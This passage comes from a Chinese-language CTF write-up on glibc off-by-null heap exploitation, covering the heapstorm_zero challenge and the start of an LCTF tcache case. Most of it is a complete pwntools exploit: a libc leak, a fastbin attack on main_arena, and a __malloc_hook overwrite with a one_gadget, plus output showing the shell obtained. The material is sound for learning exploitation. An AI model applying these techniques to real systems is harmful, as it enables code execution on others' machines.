u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 